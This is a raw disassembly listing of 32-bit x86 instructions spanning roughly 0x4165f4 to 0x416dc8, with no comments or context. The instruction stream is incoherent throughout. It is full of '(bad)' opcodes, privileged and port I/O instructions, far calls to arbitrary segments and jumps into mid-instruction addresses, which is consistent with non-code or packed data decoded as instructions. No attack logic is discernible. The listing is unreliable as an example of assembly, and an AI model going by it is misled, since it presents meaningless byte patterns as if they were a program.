  4165f4:	call   0x230e:0x658e121a
  4165fb:	sbb    BYTE PTR [esi-0x1377ee36],al
  416601:	fwait
  416602:	push   es
  416603:	pop    ebx
  416604:	fist   WORD PTR [ebx+0x6d]
  416607:	lock push ds
  416609:	inc    edi
  41660a:	rcl    al,0xab
  41660d:	jp     0x41659e
  41660f:	(bad)  
  416610:	icebp  
  416611:	imul   edx,DWORD PTR [ecx-0x1c0c8cd7],0xf8bce832
  41661b:	cwde   
  41661c:	pop    esi
  41661d:	(bad)  
  41661e:	jno    0x4165ec
  416620:	adc    al,0xdb
  416622:	rol    DWORD PTR [ebx],0x26
  416625:	pop    es
  416626:	push   ecx
  416627:	call   0xb0f8:0xddd1d28d
  41662e:	call   0x537d259f
  416633:	mov    al,0x20
  416635:	inc    ebp
  416636:	mov    al,ds:0x902a3c29
  41663b:	dec    edi
  41663c:	imul   edx,DWORD PTR [edx-0x7d],0x35
  416640:	(bad)  [esi+ebx*2-0x57]
  416644:	xchg   esi,eax
  416645:	retf   0x7cf9
  416648:	mov    dh,0xbc
  41664a:	push   edi
  41664b:	hlt    
  41664c:	and    eax,0x3d5dd0b7
  416651:	xchg   ebx,eax
  416652:	outs   dx,DWORD PTR fs:[esi]
  416654:	es jnp 0x416679
  416657:	mov    esp,0xdd87d205
  41665c:	clc    
  41665d:	sub    dl,BYTE PTR [ecx-0x777317d8]
  416663:	jl     0x41669d
  416665:	add    DWORD PTR [ebx],ebp
  416667:	sub    dh,bh
  416669:	or     DWORD PTR [ebx-0x12],ebx
  41666c:	inc    esi
  41666d:	and    bh,BYTE PTR [eax+0x71]
  416670:	test   eax,0x8648644c
  416675:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416676:	jne    0x41667a
  416678:	sar    bl,cl
  41667a:	cmp    DWORD PTR [ecx+0x9],esi
  41667d:	mov    esi,0xf5054e98
  416682:	call   0x1009:0x54620f45
  416689:	xor    eax,edi
  41668b:	pop    ebx
  41668c:	in     eax,dx
  41668d:	icebp  
  41668e:	fdiv   st(1),st
  416690:	sbb    ecx,DWORD PTR [ecx+edx*1]
  416693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416694:	mov    WORD PTR [esi+0x3],cs
  416697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416698:	push   ds
  416699:	ins    DWORD PTR es:[edi],dx
  41669a:	inc    edi
  41669b:	ss loopne 0x41662c
  41669e:	call   0x728c:0x704538e9
  4166a5:	pop    ebx
  4166a6:	lock cmp DWORD PTR [ecx+0x7f19049b],0xffffff91
  4166ae:	or     eax,0xc779e024
  4166b3:	into   
  4166b4:	push   0x4
  4166b6:	pop    es
  4166b7:	xchg   esp,eax
  4166b8:	call   0x3a86:0x596b
  4166be:	sar    DWORD PTR [ecx],0x19
  4166c1:	and    al,0x3d
  4166c3:	add    al,ch
  4166c5:	push   ebp
  4166c6:	int    0x2b
  4166c8:	push   ss
  4166c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166ca:	mov    esi,0x155d2c51
  4166cf:	rcr    DWORD PTR [ebp+0x3d],cl
  4166d2:	out    dx,eax
  4166d3:	scas   al,BYTE PTR es:[edi]
  4166d4:	outs   dx,DWORD PTR ds:[esi]
  4166d5:	rcr    DWORD PTR [edi+0x6dca3bd],0xec
  4166dc:	pop    edi
  4166dd:	lahf   
  4166de:	pop    edi
  4166df:	mov    al,0x27
  4166e1:	stos   DWORD PTR es:[edi],eax
  4166e2:	sti    
  4166e3:	fcmovne st,st(0)
  4166e5:	retf   
  4166e6:	(bad)  
  4166e7:	popf   
  4166e8:	xor    ah,al
  4166ea:	cmp    cl,BYTE PTR [esi+0x8]
  4166ed:	in     eax,0xb1
  4166ef:	aaa    
  4166f0:	push   edi
  4166f1:	repnz retf 
  4166f3:	jle    0x416700
  4166f5:	mov    ds:0xbe15fbe9,eax
  4166fa:	xlat   BYTE PTR ds:[ebx]
  4166fb:	mov    ds:0x865eba65,eax
  416700:	mov    DWORD PTR [ecx+0x4443b517],ebp
  416706:	sub    al,0x6f
  416708:	adc    eax,0xef81bcd5
  41670d:	popf   
  41670e:	gs dec ebp
  416710:	out    0xa3,eax
  416712:	leave  
  416713:	arpl   WORD PTR [esi+0xe],ax
  416716:	aad    0xf7
  416718:	pusha  
  416719:	enter  0x1158,0xa2
  41671d:	into   
  41671e:	fnstenv [ebx-0x4fbe3540]
  416724:	in     ax,dx
  416726:	cmp    DWORD PTR [esi],esi
  416728:	cdq    
  416729:	and    eax,0x276c512d
  41672e:	scas   eax,DWORD PTR es:[edi]
  41672f:	push   ss
  416730:	cmp    ch,BYTE PTR [eax+0x65234076]
  416736:	imul   esi
  416738:	dec    esi
  416739:	bound  esi,QWORD PTR [esi*4-0x22509c46]
  416740:	pop    esp
  416741:	jnp    0x4166f9
  416743:	(bad)  
  416744:	or     ecx,DWORD PTR [esi]
  416746:	xor    BYTE PTR [esi-0x5b],dh
  416749:	test   al,0x1d
  41674b:	jns    0x4166fc
  41674d:	leave  
  41674e:	ret    
  41674f:	fwait
  416750:	test   BYTE PTR [ebx],al
  416752:	jae    0x41671b
  416754:	icebp  
  416755:	push   esp
  416756:	cmp    al,0x96
  416758:	cs cwde 
  41675a:	stos   BYTE PTR es:[edi],al
  41675b:	mov    eax,ds:0x1058b685
  416760:	loope  0x416763
  416762:	fild   DWORD PTR [ebx-0x79]
  416765:	pushf  
  416766:	sub    BYTE PTR ds:0xc7bbaee7,dh
  41676c:	xchg   edx,eax
  41676d:	aad    0x7e
  41676f:	and    al,0x81
  416771:	cmp    bl,bl
  416773:	call   0x2d689eb5
  416778:	pop    es
  416779:	stos   DWORD PTR es:[edi],eax
  41677a:	fstp   QWORD PTR [ebx+0x7f]
  41677d:	sbb    eax,0xb87be2e5
  416782:	dec    esi
  416783:	sbb    DWORD PTR [edx],ecx
  416785:	imul   esi,DWORD PTR [edi+eiz*2-0x1],0x78b48194
  41678d:	fist   WORD PTR [ebx+0x7f3ab39a]
  416793:	loope  0x4167d3
  416795:	add    eax,0x82353aca
  41679a:	call   0x6533ccbe
  41679f:	jl     0x4167eb
  4167a1:	mov    bh,0x7b
  4167a3:	adc    ecx,eax
  4167a5:	aad    0x81
  4167a7:	inc    edi
  4167a8:	push   ss
  4167a9:	push   eax
  4167aa:	inc    esp
  4167ab:	jno    0x4167c4
  4167ad:	pushf  
  4167ae:	fdivr  QWORD PTR [ebx+0x711e2ce8]
  4167b4:	pop    esp
  4167b5:	popa   
  4167b6:	loop   0x4167a4
  4167b8:	gs hlt 
  4167ba:	js     0x416783
  4167bc:	push   es
  4167bd:	sti    
  4167be:	pop    edi
  4167bf:	inc    esp
  4167c0:	retf   
  4167c1:	xchg   esp,eax
  4167c2:	dec    edx
  4167c3:	mov    ?,WORD PTR [esi]
  4167c5:	mov    ds:0x43f36ca9,al
  4167ca:	xchg   esp,eax
  4167cb:	data16 jno 0x4167b1
  4167ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167cf:	push   edx
  4167d0:	and    BYTE PTR [eax-0x53],0xe0
  4167d4:	push   cs
  4167d5:	sub    eax,0x8efdec29
  4167da:	push   esp
  4167dc:	pop    ebp
  4167dd:	or     DWORD PTR [eax+0x63],edi
  4167e0:	push   0x39
  4167e2:	jmp    0xf837:0x9fa314f9
  4167e9:	pop    ss
  4167ea:	cld    
  4167eb:	mov    dh,BYTE PTR [edi+0x2f]
  4167ee:	inc    edi
  4167ef:	inc    esp
  4167f0:	cmp    eax,0xcecc156f
  4167f5:	fnstsw WORD PTR [edx+eiz*8+0x4b]
  4167f9:	lock inc esp
  4167fb:	ret    0xd663
  4167fe:	hlt    
  4167ff:	xor    DWORD PTR [edx],ecx
  416801:	inc    BYTE PTR [edx+0x67]
  416804:	xadd   DWORD PTR [esp+ebx*1-0x64],edx
  416809:	(bad)  
  41680a:	das    
  41680b:	imul   ecx,DWORD PTR [ecx+ecx*4-0x4062a89],0xf99b7107
  416816:	dec    ebp
  416817:	out    dx,eax
  416818:	xor    ebx,DWORD PTR [edx+0x1a]
  41681b:	lahf   
  41681c:	cmp    BYTE PTR [eax],bl
  41681e:	push   es
  41681f:	fld    QWORD PTR [eax-0x2dc04d84]
  416825:	std    
  416826:	push   es
  416827:	xor    DWORD PTR [bp+si-0x7555],ebx
  41682c:	or     BYTE PTR [esi-0x2a],0x49
  416830:	out    0xb3,al
  416832:	cdq    
  416833:	addr16 sbb al,0xed
  416836:	mov    edi,DWORD PTR [eax-0x1908c420]
  41683c:	jmp    0x416858
  41683e:	mov    ah,0x86
  416840:	into   
  416841:	bound  ecx,QWORD PTR [ecx+0x76]
  416844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416845:	popa   
  416846:	fbstp  TBYTE PTR [ebx]
  416848:	pop    esp
  416849:	ins    BYTE PTR es:[edi],dx
  41684a:	lods   eax,DWORD PTR ds:[esi]
  41684b:	mov    bh,0x41
  41684d:	adc    edi,edx
  41684f:	adc    esp,DWORD PTR [edi+edx*4-0x9b7e664]
  416856:	jne    0x416828
  416858:	jge    0x416824
  41685a:	fs mov al,0x66
  41685d:	retf   
  41685e:	push   0x822a1123
  416863:	icebp  
  416864:	push   esi
  416865:	lods   eax,DWORD PTR ds:[esi]
  416866:	add    esi,DWORD PTR [edi+edx*1-0x5e]
  41686a:	jmp    0xf840dccd
  41686f:	sub    BYTE PTR [esi],dl
  416871:	or     esi,DWORD PTR [edx+0x53db2a1b]
  416877:	mov    dh,0xfd
  416879:	into   
  41687a:	and    ch,BYTE PTR [ecx-0x3]
  41687d:	push   ds
  41687e:	fdiv   DWORD PTR [ecx-0x21c58902]
  416884:	bound  ebp,QWORD PTR [edx-0x5f]
  416887:	mov    dl,0x49
  416889:	loop   0x416829
  41688b:	sbb    al,0x3
  41688d:	jmp    0x19a7a8ec
  416892:	hlt    
  416893:	add    al,0xcc
  416895:	mov    esp,0x8b35ee96
  41689a:	div    DWORD PTR [esi]
  41689c:	dec    edi
  41689d:	sbb    DWORD PTR [ebp+0x3058344b],0xffffff9c
  4168a4:	cld    
  4168a5:	mov    ebp,0xc66e1993
  4168aa:	jecxz  0x4168cc
  4168ac:	lea    ebp,[esi+0x1d]
  4168af:	jb     0x4168d3
  4168b1:	xor    al,0xf7
  4168b3:	test   BYTE PTR fs:[esi-0x57f193cf],ah
  4168ba:	(bad)  
  4168bb:	cld    
  4168bc:	or     ebp,eax
  4168be:	add    ch,BYTE PTR ss:[edx+0x34]
  4168c2:	in     al,dx
  4168c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168c4:	(bad)  
  4168c6:	test   eax,0xebb2e750
  4168cb:	(bad)  
  4168cc:	sub    DWORD PTR [edi-0x1ff5cdd3],esp
  4168d2:	cmp    DWORD PTR [ebx+0x1d],esi
  4168d5:	bound  edx,QWORD PTR [edi+0x23]
  4168d8:	sbb    eax,0xac25a8c3
  4168dd:	loop   0x416950
  4168df:	fcmovnu st,st(2)
  4168e1:	aad    0xcc
  4168e3:	mov    eax,ds:0xc10f1ac1
  4168e8:	dec    ecx
  4168e9:	add    eax,0xfe499230
  4168ee:	mov    eax,0xdc12ae0
  4168f3:	imul   edx,DWORD PTR [esi],0x610c23dd
  4168f9:	stos   DWORD PTR es:[edi],eax
  4168fa:	rcr    BYTE PTR [edi+ecx*2-0x7b],cl
  4168fe:	test   DWORD PTR [ebx+edx*8],0x3be7bbfc
  416905:	out    0x45,eax
  416907:	push   esi
  416908:	add    al,BYTE PTR [edx+0x24]
  41690b:	popa   
  41690c:	xchg   DWORD PTR [ecx+ebx*8+0x54f95a33],eax
  416913:	into   
  416914:	(bad)  
  416915:	sti    
  416916:	retf   
  416917:	mov    bh,0xf5
  416919:	or     al,0xf5
  41691b:	jle    0x416911
  41691d:	inc    edx
  41691e:	push   0x309d9474
  416923:	and    esi,edi
  416925:	sub    al,0x2b
  416927:	out    0x13,al
  416929:	xor    eax,edx
  41692b:	adc    al,0x6c
  41692d:	dec    cx
  41692f:	ret    0x289a
  416932:	push   esi
  416933:	(bad)  
  416934:	xchg   esp,eax
  416935:	nop
  416936:	add    edi,DWORD PTR [edx-0x5415b16c]
  41693c:	ficomp DWORD PTR [eax-0x1357df08]
  416942:	mov    cl,0x5a
  416944:	mov    ch,ch
  416946:	mov    ebp,0x3ee7a19c
  41694b:	or     dh,ch
  41694d:	(bad)  
  41694e:	retf   
  41694f:	mov    ebx,0x4ebae3e7
  416954:	mov    DWORD PTR [edi+0x5713f744],edx
  41695a:	cmc    
  41695b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41695c:	add    esi,DWORD PTR [ecx+0x228a9a1a]
  416962:	and    eax,0xb1cedc94
  416967:	xchg   edi,eax
  416968:	or     edx,esp
  41696a:	xchg   DWORD PTR [ecx+0x37],esp
  41696d:	cwde   
  41696e:	sbb    esi,edx
  416970:	lods   al,BYTE PTR ds:[esi]
  416971:	jns    0x416923
  416973:	push   esp
  416974:	or     DWORD PTR [esi+0x6d],0x2420e455
  41697b:	loope  0x4169ab
  41697d:	dec    esp
  41697e:	test   DWORD PTR [ebx+0x69],esp
  416981:	xchg   ebp,eax
  416982:	and    ah,cl
  416984:	jmp    0x84b50eaf
  416989:	fwait
  41698a:	and    al,dl
  41698c:	add    eax,0xe09e4674
  416991:	mov    esi,DWORD PTR [ecx]
  416993:	jae    0x4169f7
  416995:	jg     0x416998
  416997:	and    bh,BYTE PTR [ecx]
  416999:	adc    DWORD PTR [esi],edx
  41699b:	adc    edi,DWORD PTR [edx+0x3e64d515]
  4169a1:	mov    ebp,0x17040e78
  4169a6:	jb     0x416a06
  4169a8:	jns    0x41694e
  4169aa:	cmp    ebx,edi
  4169ac:	or     DWORD PTR [edi+0x1d],ebp
  4169af:	cs in  al,0x70
  4169b2:	scas   eax,DWORD PTR es:[edi]
  4169b3:	sar    esp,cl
  4169b5:	sbb    al,0x7a
  4169b7:	adc    DWORD PTR [ebp-0x6e8bf6d],eax
  4169bd:	sub    al,0x66
  4169bf:	pop    esp
  4169c0:	idiv   DWORD PTR [edx]
  4169c2:	dec    ebx
  4169c3:	xor    dl,BYTE PTR [eax]
  4169c5:	cdq    
  4169c6:	push   ebx
  4169c7:	adc    DWORD PTR [eax+0x6ff45526],eax
  4169cd:	popf   
  4169ce:	or     ah,BYTE PTR [eax]
  4169d0:	nop
  4169d1:	or     al,BYTE PTR [ebx-0x78]
  4169d4:	xor    DWORD PTR [ebx+0x1d],eax
  4169d7:	addr16 xchg ch,bl
  4169da:	out    dx,al
  4169db:	push   0xa155d184
  4169e0:	test   DWORD PTR [eax+0xe],edx
  4169e3:	push   edi
  4169e4:	mov    dl,BYTE PTR [esp+eax*2-0xe]
  4169e8:	leave  
  4169e9:	repnz mov dh,0x70
  4169ec:	mov    edi,0xd440325e
  4169f1:	mov    edx,0xe12af3f7
  4169f6:	adc    BYTE PTR [edi],bh
  4169f8:	mov    eax,ds:0x7c615979
  4169fd:	and    eax,0xac4c0ef8
  416a02:	dec    esp
  416a03:	inc    edx
  416a04:	fwait
  416a05:	dec    edi
  416a06:	adc    BYTE PTR ss:[ebp-0xbe3d58a],al
  416a0d:	or     esp,esi
  416a0f:	shl    BYTE PTR [eax+0x5a],cl
  416a12:	xor    ch,BYTE PTR [ebx-0x4f]
  416a15:	fisubr DWORD PTR [edx]
  416a17:	xchg   ebp,eax
  416a18:	adc    al,0xd2
  416a1a:	pop    ds
  416a1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a1c:	inc    DWORD PTR [esi]
  416a1e:	pusha  
  416a1f:	mov    cl,0x30
  416a21:	and    BYTE PTR [ebx+0x5],ah
  416a24:	xchg   al,bl
  416a26:	add    DWORD PTR [esi],esp
  416a28:	adc    dl,ch
  416a2a:	ins    BYTE PTR es:[edi],dx
  416a2b:	cmp    DWORD PTR [edi],ecx
  416a2d:	cmp    cl,bh
  416a2f:	int    0x4e
  416a31:	pop    ebp
  416a32:	cmp    al,0x1e
  416a34:	mov    ds:0xc7306961,eax
  416a39:	mov    gs,WORD PTR [eax+0x2ff01a2e]
  416a3f:	retf   
  416a40:	inc    esi
  416a41:	shl    BYTE PTR [eax],0x3b
  416a44:	(bad)  
  416a45:	out    dx,eax
  416a46:	mov    edi,DWORD PTR ds:0x7c7eb86e
  416a4c:	cli    
  416a4d:	sbb    BYTE PTR [ebp-0x3a],dh
  416a50:	pop    ecx
  416a51:	pop    esi
  416a52:	stc    
  416a53:	pop    ebx
  416a54:	inc    ecx
  416a55:	addr16 and eax,0x25889853
  416a5b:	push   esi
  416a5c:	pand   mm5,QWORD PTR [ecx]
  416a5f:	jp     0x416a70
  416a61:	dec    eax
  416a62:	ror    DWORD PTR [esi-0x21],1
  416a65:	test   eax,0x79d8489e
  416a6a:	jg     0x416aca
  416a6c:	jg     0x416a46
  416a6e:	aad    0xb8
  416a70:	dec    edi
  416a71:	fdivr  st,st(1)
  416a73:	sub    al,0x56
  416a75:	xor    eax,0xe8dbdfcb
  416a7a:	into   
  416a7b:	jbe    0x416ae8
  416a7d:	mov    al,0x6f
  416a7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a80:	test   eax,esi
  416a82:	call   0xa3bff379
  416a87:	jecxz  0x416a6a
  416a89:	adc    ch,BYTE PTR [ecx-0x62350e8f]
  416a8f:	daa    
  416a90:	lods   eax,DWORD PTR ds:[esi]
  416a91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a92:	push   ebx
  416a93:	add    esp,edx
  416a95:	sub    BYTE PTR [ebx-0x1a],ah
  416a98:	fidivr DWORD PTR [edx-0x207f37f6]
  416a9e:	mov    BYTE PTR ds:0xaa5072f6,dh
  416aa4:	dec    DWORD PTR [eax-0x7b]
  416aa7:	loope  0x416b10
  416aa9:	or     eax,0x11523173
  416aae:	scas   al,BYTE PTR es:[edi]
  416aaf:	push   ds
  416ab0:	in     al,0x38
  416ab2:	hlt    
  416ab3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ab4:	sbb    al,0x32
  416ab6:	jbe    0x416abf
  416ab8:	dec    ebp
  416ab9:	sbb    DWORD PTR [ecx],eax
  416abb:	xchg   ebp,ebx
  416abd:	popa   
  416abe:	fwait
  416abf:	xor    DWORD PTR [esp+edi*8-0x1772a0c6],ebx
  416ac6:	(bad)
  416ac9:	pop    edx
  416aca:	add    esp,DWORD PTR [edi+0x7ad5bc75]
  416ad0:	or     esp,esi
  416ad2:	sub    DWORD PTR [ebp+0x784cd04],esi
  416ad8:	lea    ebx,[esi+edx*1]
  416adb:	add    bl,BYTE PTR [ebx+0x6455c734]
  416ae1:	mov    eax,ds:0xe5209e36
  416ae6:	sub    DWORD PTR [edx+eax*1],0xffffff92
  416aea:	xchg   edi,eax
  416aeb:	adc    eax,ebx
  416aed:	pusha  
  416aee:	ins    BYTE PTR es:[edi],dx
  416aef:	push   0x181f8832
  416af4:	nop
  416af5:	pop    ds
  416af6:	imul   eax,DWORD PTR [edx],0x5c
  416af9:	mov    bh,BYTE PTR [edi+0x694954d3]
  416aff:	dec    esp
  416b00:	stos   BYTE PTR es:[edi],al
  416b01:	and    al,0xfb
  416b03:	test   al,0x93
  416b05:	jle    0x416ad7
  416b07:	daa    
  416b08:	sbb    edx,DWORD PTR [esi+esi*4+0xfe1d778]
  416b0f:	push   edx
  416b10:	xchg   BYTE PTR [ecx+0x5a],dl
  416b13:	cmp    DWORD PTR ds:0x64fb4eae,ebp
  416b19:	mov    ebx,0xd4f1158d
  416b1e:	jnp    0x416aa5
  416b20:	inc    esi
  416b21:	pop    es
  416b22:	xor    dh,BYTE PTR [ebx-0x881f18c]
  416b28:	lods   al,BYTE PTR ds:[esi]
  416b29:	aad    0x6e
  416b2b:	push   es
  416b2c:	and    al,0x80
  416b2e:	push   esi
  416b2f:	xor    BYTE PTR [esi],cl
  416b31:	push   ebp
  416b32:	loop   0x416aea
  416b34:	rol    DWORD PTR [ebx],cl
  416b36:	les    edi,FWORD PTR [edi]
  416b38:	jmp    0xdac:0x8c531e2a
  416b3f:	jmp    0x35e41ec4
  416b44:	jmp    0x416b22
  416b46:	in     al,0x71
  416b48:	es ja  0x416b4c
  416b4b:	pop    ebx
  416b4c:	in     al,0x76
  416b4e:	mov    dl,0xea
  416b50:	sub    BYTE PTR [edi-0x5f9df6c7],ah
  416b56:	xor    DWORD PTR [eax],eax
  416b58:	xchg   esp,eax
  416b59:	cmp    al,0x61
  416b5b:	pop    ds
  416b5c:	fbstp  TBYTE PTR [esi-0x5fb1f1cf]
  416b62:	out    dx,al
  416b63:	int3   
  416b64:	loope  0x416bcb
  416b66:	div    BYTE PTR [ecx+0x4b30e0b8]
  416b6c:	ins    BYTE PTR es:[edi],dx
  416b6d:	dec    eax
  416b6e:	mov    dl,0x4c
  416b70:	xchg   esp,eax
  416b71:	jp     0x416b33
  416b73:	jg     0x416bc8
  416b75:	mov    BYTE PTR [eax+0x7b33e75b],0x3d
  416b7c:	repz sub al,0x9
  416b7f:	imul   edx,DWORD PTR [ecx-0x5d],0x46
  416b83:	push   0xffffffb9
  416b85:	int3   
  416b86:	and    ch,BYTE PTR [ebp-0x4b5c309b]
  416b8c:	mov    ds:0xf6766fe7,al
  416b91:	push   esp
  416b92:	test   eax,0xef6e2a59
  416b97:	icebp  
  416b98:	sahf   
  416b99:	cmp    DWORD PTR [eax-0x68],esp
  416b9c:	fimul  DWORD PTR ds:0x231193
  416ba2:	sbb    BYTE PTR [ebp+0x57],bh
  416ba5:	arpl   WORD PTR [esi+0x23],si
  416ba8:	sti    
  416ba9:	in     al,dx
  416baa:	retf   
  416bab:	pop    ss
  416bac:	fstp   st(2)
  416bae:	mov    esi,DWORD PTR [ebx]
  416bb0:	jle    0x416ba0
  416bb2:	adc    eax,0xde113c65
  416bb7:	inc    edi
  416bb8:	pop    ebp
  416bb9:	sub    edx,DWORD PTR [ebx+0x7fd8d552]
  416bbf:	sbb    al,0x6
  416bc1:	les    ecx,FWORD PTR [ecx]
  416bc3:	adc    DWORD PTR [ecx+0x76522d35],eax
  416bc9:	pop    eax
  416bca:	cmp    eax,0x71a8dae2
  416bcf:	mov    WORD PTR [ecx+0x3e710a06],?
  416bd5:	sub    BYTE PTR [edx+0x7],ch
  416bd8:	dec    edi
  416bd9:	push   ss
  416bda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bdb:	outs   dx,DWORD PTR ds:[esi]
  416bdc:	xchg   ebx,eax
  416bdd:	mov    eax,0x2ee34813
  416be2:	lea    ecx,[edx]
  416be4:	es mov dl,0xca
  416be7:	xlat   BYTE PTR ds:[ebx]
  416be8:	hlt    
  416be9:	jle    0x416bbd
  416beb:	hlt    
  416bec:	into   
  416bed:	mov    ebp,0xc0066f2f
  416bf2:	ret    0xb3a8
  416bf5:	gs or  al,0xb4
  416bf8:	cli    
  416bf9:	fstp   QWORD PTR [edi-0x560acf3d]
  416bff:	jnp    0x416b86
  416c01:	enter  0xa55f,0x8a
  416c05:	mov    DWORD PTR [esi+0x3315a43b],0x5fb9c21a
  416c0f:	mov    dl,0x5e
  416c11:	mov    al,ds:0xc62cd1f3
  416c16:	pop    esp
  416c17:	and    DWORD PTR [ebx],ebx
  416c19:	add    BYTE PTR [esi],dl
  416c1b:	ret    0x445c
  416c1e:	or     DWORD PTR [esi],ebx
  416c20:	outs   dx,DWORD PTR ds:[esi]
  416c21:	jbe    0x416c9c
  416c23:	inc    ebp
  416c24:	retf   
  416c25:	lock in eax,dx
  416c27:	cmp    bl,bh
  416c29:	shr    DWORD PTR [ebp+0xb8bb8c3],cl
  416c2f:	push   esp
  416c30:	mov    ds:0x2e7f38a2,eax
  416c35:	jns    0x416bba
  416c37:	in     eax,0x32
  416c39:	shl    BYTE PTR [edi],0xec
  416c3c:	xchg   esp,eax
  416c3d:	cmp    eax,0xc4c3119
  416c42:	push   ebp
  416c43:	xchg   DWORD PTR [edx+0xf35708],esi
  416c49:	scas   al,BYTE PTR es:[edi]
  416c4a:	xchg   eax,edx
  416c4c:	pop    ss
  416c4d:	dec    edi
  416c4e:	mov    fs,WORD PTR [edx+0x14]
  416c51:	mov    dh,0x4d
  416c53:	cmp    BYTE PTR [edi+ecx*2+0x2b5401ee],0xb5
  416c5b:	sti    
  416c5c:	xor    edx,DWORD PTR [esi+0x22e35fea]
  416c62:	mov    eax,0xd2a6997d
  416c67:	ja     0x416cd2
  416c69:	adc    DWORD PTR [ebp-0x43de1521],ebp
  416c6f:	inc    eax
  416c70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c71:	add    bh,BYTE PTR [eax]
  416c73:	pop    esp
  416c74:	imul   ebp,DWORD PTR ds:0x2a237eb8,0x552ad4b3
  416c7e:	push   esi
  416c7f:	pop    ecx
  416c80:	add    esp,DWORD PTR [eax]
  416c82:	shl    BYTE PTR [eax],1
  416c84:	scas   eax,DWORD PTR es:[edi]
  416c85:	shl    DWORD PTR [edi],cl
  416c87:	clc    
  416c88:	xor    DWORD PTR [edi+0x38786dd0],edi
  416c8e:	test   eax,0x4099c74e
  416c93:	mov    WORD PTR [ebp+ecx*4+0x28d9c17f],es
  416c9a:	jbe    0x416c2d
  416c9c:	fimul  DWORD PTR [ebx-0x4e]
  416c9f:	and    ebp,DWORD PTR [esi*4+0x1fd817dd]
  416ca6:	inc    ebp
  416ca7:	pushf  
  416ca8:	xchg   ebp,eax
  416ca9:	out    0x9e,eax
  416cab:	dec    edi
  416cac:	jnp    0x416cb6
  416cae:	jmp    0x416c5d
  416cb0:	daa    
  416cb1:	add    eax,DWORD PTR [edi]
  416cb3:	dec    eax
  416cb4:	cmp    BYTE PTR [edx],ch
  416cb6:	jmp    DWORD PTR [edi+edi*2-0x43]
  416cba:	mov    dl,0xe3
  416cbc:	push   eax
  416cbd:	dec    edx
  416cbe:	push   edx
  416cbf:	test   DWORD PTR [eax+0x7a],0xcaa2371e
  416cc6:	sbb    eax,0x3c24e8f7
  416ccb:	out    0xf9,al
  416ccd:	stos   DWORD PTR es:[edi],eax
  416cce:	ins    BYTE PTR es:[edi],dx
  416ccf:	mov    bl,0xf6
  416cd1:	adc    al,0x22
  416cd3:	mov    esi,0xa42ee6dc
  416cd8:	cwde   
  416cd9:	ficom  DWORD PTR [ecx]
  416cdb:	stos   BYTE PTR es:[edi],al
  416cdc:	loope  0x416d4a
  416cde:	adc    esi,DWORD PTR [ebx]
  416ce0:	adc    BYTE PTR [ecx],dh
  416ce2:	gs popf 
  416ce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ce5:	ins    BYTE PTR es:[di],dx
  416ce7:	(bad)  
  416ce9:	add    DWORD PTR [edx],0xa398167f
  416cef:	push   esp
  416cf0:	(bad)  
  416cf1:	push   edx
  416cf3:	gs pop es
  416cf5:	or     bl,BYTE PTR [edi+0x7b9cf3d5]
  416cfb:	pop    ebp
  416cfc:	mov    esp,0x42e14f17
  416d01:	push   cs
  416d02:	outs   dx,BYTE PTR ds:[esi]
  416d03:	ret    
  416d04:	and    DWORD PTR [edx-0x14],eax
  416d07:	retf   0x4d4a
  416d0a:	inc    edi
  416d0b:	mov    ?,WORD PTR [ecx+0xdf414b9]
  416d11:	daa    
  416d12:	rcr    BYTE PTR [eax+edi*4-0x61],cl
  416d16:	repz or ah,al
  416d19:	mov    cl,0x6b
  416d1b:	call   0x113547c7
  416d20:	or     eax,0x48164baa
  416d25:	jmp    0x416d8b
  416d27:	sbb    eax,0x631624af
  416d2c:	(bad)  
  416d2d:	and    al,0x9a
  416d2f:	call   0x91aa:0x6b90c092
  416d36:	cmp    BYTE PTR [edi],ah
  416d38:	inc    edx
  416d39:	mov    ecx,0xc97d7f0d
  416d3e:	pop    ecx
  416d3f:	iret   
  416d40:	ss lahf 
  416d42:	rcr    DWORD PTR ds:0x86eec206,cl
  416d48:	dec    edx
  416d49:	xor    eax,0x58f4d59
  416d4e:	fisttp QWORD PTR [eax+edi*8]
  416d51:	and    DWORD PTR [esi-0x6f],0x3f
  416d55:	fbld   TBYTE PTR ds:0xba714059
  416d5b:	(bad)  
  416d5c:	cmp    al,0xb2
  416d5e:	daa    
  416d5f:	xchg   BYTE PTR es:[eax-0x1dd46bdf],al
  416d66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d67:	or     eax,0xb4332cbe
  416d6c:	call   0x46bf:0x3a743978
  416d73:	mov    bl,0x17
  416d75:	or     ebp,DWORD PTR [edi+0x17]
  416d78:	jge    0x416d42
  416d7a:	(bad)  
  416d7b:	xor    esp,ecx
  416d7d:	or     eax,0xd887ae1b
  416d82:	xor    cl,BYTE PTR [edi-0x79]
  416d85:	bnd jnp 0x416d7a
  416d88:	xchg   ebx,eax
  416d89:	(bad)  
  416d8b:	cli    
  416d8c:	popa   
  416d8d:	add    BYTE PTR [ebx+0x4c],bh
  416d90:	and    al,0x78
  416d92:	xor    dl,BYTE PTR [ecx-0x5b5239ce]
  416d98:	inc    eax
  416d99:	add    DWORD PTR cs:0x92b56961,edx
  416da0:	and    eax,0xe77f8159
  416da5:	mov    ebx,0x5e8fca83
  416daa:	adc    bh,dl
  416dac:	xchg   edi,eax
  416dad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dae:	in     al,0xeb
  416db0:	or     BYTE PTR [eax],bl
  416db2:	sub    al,0x96
  416db4:	sbb    esi,ebx
  416db6:	push   esi
  416db7:	and    ch,BYTE PTR [ebp-0x5abca0f6]
  416dbd:	adc    BYTE PTR [eax+0x52],ch
  416dc0:	lea    eax,[esi-0x1b7f6130]
  416dc6:	jae    0x416e22
  416dc8:	outs   dx,DWORD PTR ds:[esi]
